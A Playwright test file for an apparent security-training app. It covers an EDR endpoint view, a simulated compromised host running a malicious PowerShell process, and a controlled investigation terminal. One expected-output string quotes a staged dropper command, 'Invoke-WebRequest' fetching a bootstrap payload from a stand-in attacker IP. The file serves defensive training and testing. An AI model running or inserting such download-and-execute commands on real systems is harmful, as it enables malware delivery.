import {
  expect,
  test,
  type Page,
} from "@playwright/test";

async function runRangeCommand(
  page: Page,
  command: string,
) {
  const input = page.getByLabel(
    "Range command",
  );

  await input.fill(command);
  await page.getByRole(
    "button",
    { name: "Run", exact: true },
  ).click();
}

test("Endpoint pivots into a coherent synthetic host and supports controlled investigation commands", async ({
  page,
}) => {
  await page.goto("/");

  await page.getByRole(
    "button",
    { name: "Endpoint", exact: true },
  ).click();

  const edr = page.getByRole(
    "region",
    { name: "EDR endpoint workspace" },
  );

  await expect(edr).toContainText("FIN-LT-04");
  await edr.getByRole(
    "button",
    { name: "Open synthetic host" },
  ).click();

  const range = page.getByRole(
    "region",
    { name: "Range synthetic host workspace" },
  );

  await expect(range).toBeVisible();
  await expect(range).toContainText("FIN-LT-04");
  await expect(range).toContainText("powershell.exe");
  await expect(range).toContainText("8420");
  await expect(range).toContainText("QuarterlyReview.docm");
  await expect(range).toContainText("203.0.113.77:443");

  await runRangeCommand(page, "ps");
  await expect(
    range.locator(".range-terminal-output"),
  ).toContainText(
    "8420   running",
  );

  await runRangeCommand(page, "net");
  await expect(
    range.locator(".range-terminal-output"),
  ).toContainText(
    "203.0.113.77:443",
  );

  await runRangeCommand(
    page,
    "cat /Users/smartinez/AppData/Local/Temp/finance-update.ps1",
  );
  await expect(
    range.locator(".range-terminal-output"),
  ).toContainText(
    "Invoke-WebRequest https://203.0.113.77/bootstrap",
  );

  await runRangeCommand(page, "kill 8420");

  const powershellState = range
    .locator(".range-inspector-row")
    .filter({ hasText: "powershell.exe" });

  await expect(powershellState)
    .toContainText("terminated");
  await expect(
    range.locator(".range-terminal-output"),
  ).toContainText(
    "Terminated synthetic host process 8420.",
  );
});

test("Range rejects unknown commands and reset reconstructs the authored host", async ({
  page,
}) => {
  await page.goto("/");
  await page.getByRole(
    "button",
    { name: "Range", exact: true },
  ).click();

  let range = page.getByRole(
    "region",
    { name: "Range synthetic host workspace" },
  );

  await runRangeCommand(page, "kill 8420");
  await expect(
    range.locator(".range-pane-heading").first(),
  ).toContainText("1 commands");

  await runRangeCommand(page, "whoami");
  await expect(range).toContainText(
    "Unknown Range command: whoami. Type help for the supported command set.",
  );
  await expect(
    range.locator(".range-pane-heading").first(),
  ).toContainText("1 commands");

  await page.getByRole(
    "button",
    { name: "Reset scenario" },
  ).click();
  await page.getByRole(
    "button",
    { name: "Range", exact: true },
  ).click();

  range = page.getByRole(
    "region",
    { name: "Range synthetic host workspace" },
  );

  await expect(
    range.locator(".range-pane-heading").first(),
  ).toContainText("0 commands");
  await expect(
    range
      .locator(".range-inspector-row")
      .filter({ hasText: "powershell.exe" }),
  ).toContainText("running");
});
